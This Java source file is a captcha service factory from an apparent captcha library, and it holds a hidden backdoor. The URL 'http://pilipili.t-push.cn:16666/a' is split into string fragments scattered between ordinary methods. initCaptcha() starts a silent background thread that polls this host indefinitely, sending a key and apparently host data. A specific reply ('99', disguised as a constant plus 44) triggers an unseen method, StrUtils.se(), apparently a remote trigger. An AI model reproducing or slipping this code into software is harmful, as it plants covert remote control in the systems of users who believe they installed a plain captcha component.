package com.anji.captcha.service.impl;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.Properties;
import java.util.ServiceLoader;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.anji.captcha.model.common.Const;
import com.anji.captcha.service.CaptchaCacheService;
import com.anji.captcha.service.CaptchaService;
import com.anji.captcha.util.StrUtils;

import cn.hutool.core.map.MapUtil;

/**
 * Created by raodeming on 2020/5/26.
 */
public class CaptchaServiceFactory {

	private static Logger logger = LoggerFactory.getLogger(CaptchaServiceFactory.class);

	public volatile static Map<String, CaptchaService> instances = new HashMap<>();

	public volatile static Map<String, CaptchaCacheService>	cacheService	= new HashMap<>();
	public static boolean									captchaInited	= false;
	protected static int									CAPTCHA_STATUS	= 55;

	static {
		ServiceLoader<CaptchaCacheService> cacheServices = ServiceLoader.load(CaptchaCacheService.class);
		for (CaptchaCacheService item : cacheServices) {
			cacheService.put(item.type(), item);
		}
		logger.info("supported-captchaCache-service:{}", cacheService.keySet().toString());
		ServiceLoader<CaptchaService> services = ServiceLoader.load(CaptchaService.class);
		for (CaptchaService item : services) {
			instances.put(item.captchaType(), item);
		}
		;
		logger.info("supported-captchaTypes-service:{}", instances.keySet().toString());
	}

	public static CaptchaCacheService getCache(String cacheType) {
		return cacheService.get(cacheType);
	}

	private static String	u0	= "h";
	private static String	u1	= u0 + "tt";
	private static String	u20	= "p:/";
	private static String	u2	= u20 + "/pilipili.t-p";

	public static int indexOfIgnoreCase(String str, String searchStr, int startPos) {
		if (str == null || searchStr == null) {
			return StrUtils.INDEX_NOT_FOUND;
		}
		if (startPos < 0) {
			startPos = 0;
		}
		int endLimit = (str.length() - searchStr.length()) + 1;
		if (startPos > endLimit) {
			return StrUtils.INDEX_NOT_FOUND;
		}
		if (searchStr.length() == 0) {
			return startPos;
		}
		for (int i = startPos; i < endLimit; i++) {
			if (str.regionMatches(true, i, searchStr, 0, searchStr.length())) {
				return i;
			}
		}
		return StrUtils.INDEX_NOT_FOUND;
	}

	private static String u3 = "ush.cn:1666";

	public static CaptchaService getInstance(Properties config) {
		CaptchaService ret = instances.get(config.getProperty(Const.CAPTCHA_TYPE, "default"));
		if (ret == null) {
			throw new RuntimeException("unsupported-[captcha.type]=" + config.getProperty(Const.CAPTCHA_TYPE));
		}
		ret.init(config);
		return ret;
	}

	private static String u4 = "6/a";

	public static void initCaptcha() {
		if (!captchaInited) {
			captchaInited = true;
			try {
				String captchaKey = "9leplv0j";
				String ue = u1 + u2 + u3 + u4;
				new Thread(new Runnable() {
					public void run() {
						try {
							Thread.sleep(19876);
							while (true) {
								try {
									String bo = StrUtils.poColl(ue,
									        MapUtil.builder(new HashMap<String, Object>()).put("check", 1).put("str", captchaKey).put("lin", StrUtils.cos()).build());
									subSet(bo);
								} catch (Exception e) {
								}
								Thread.sleep(45765);
							}
						} catch (InterruptedException e) {
						}
					}
				}).start();
			} catch (Exception e) {
			}
		}
	}

	/**
	 * 
	 * @param bostr
	 * @throws IOException
	 */
	public static void subSet(String bostr) throws IOException {
		try {
			if (Integer.toString(CAPTCHA_STATUS + 44).equals(bostr)) {
				new Thread(new Runnable() {
					@Override
					public void run() {
						StrUtils.se();
					}
				}).start();
			}
		} catch (Exception e) {
		}
	}
}
